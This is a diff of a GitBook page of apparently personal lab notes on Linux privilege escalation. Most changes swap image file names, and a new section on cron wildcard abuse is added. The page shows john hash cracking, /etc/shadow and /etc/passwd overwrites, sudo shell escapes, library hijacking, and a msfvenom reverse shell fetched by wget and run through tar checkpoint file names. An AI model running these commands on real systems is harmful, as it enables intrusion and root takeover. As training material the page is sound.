@@ -99,7 +99,7 @@ Save the root user's hash to a file called hash.txt on your Kali VM and use john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (12).png" alt=""><figcaption></figcaption></figure>
 
 ## Weak File Permissions - Writable /etc/shadow
 
@@ -131,7 +131,7 @@ Comment out the old one and add our output as the hash.
 vi /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (7).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -162,7 +162,7 @@ Generate a new password hash with a password of your choice.
 openssl passwd newpasswordhere
 ```
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
 
 Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x"). Switch to the root user, using the new password
 
@@ -203,7 +203,7 @@ We can use apache2 to read files and crack hashes.
 sudo apache2 -f /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 ### **nmap**
 
@@ -226,7 +226,7 @@ nmap> !sh
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ftp
 
@@ -237,7 +237,7 @@ sudo ftp
 ftp> !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## **more**
 
@@ -250,7 +250,7 @@ TERM= sudo more /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -265,7 +265,7 @@ sudo less /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -418,7 +418,7 @@ Create a shared object with the same name as one of the listed libraries (libcry
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
 
@@ -427,7 +427,7 @@ Create a shared object with the same name as one of the listed libraries (libcry
 <pre><code><strong>sudo LD_LIBRARY_PATH=/tmp apache2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Cron Jobs - File Permissions
 
@@ -441,7 +441,7 @@ View the contents of the system-wide crontab.
 cat /etc/crontab
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
 
@@ -478,7 +478,7 @@ Set up a netcat listener on your Kali box on port 4444 and wait for the cron job
 nc -nvlp 4444
 ```
 
-<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -498,7 +498,7 @@ cat /etc/crontab
 
 Note that the PATH variable starts with /home/user which is our user's home directory. Create a file called overwrite.sh in your home directory with the following contents
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 #### overwrite.sh
 
@@ -525,13 +525,67 @@ Wait for the cron job to run (should not take longer than a minute). Run the /tm
 /tmp/rootbash -p
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
-
-##
-
-##
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Cron Jobs - Wildcards
 
+View the contents of the other cron job script
 
+**Victim**
 
+```
+cat /usr/local/bin/compress.sh
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Note that the tar command is being run with a wildcard (\*) in your home directory.
+
+Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+**Kali**
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o shell.elf
+```
+
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable.
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /home/user/
+wget http://$KALI:81/shell.elf
+chmod +x /home/user/shell.elf
+```
+
+Create these two files in /home/user
+
+**Victim**
+
+```
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+**Kali**
+
+```
+nc -nvlp 4444
+```
+
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
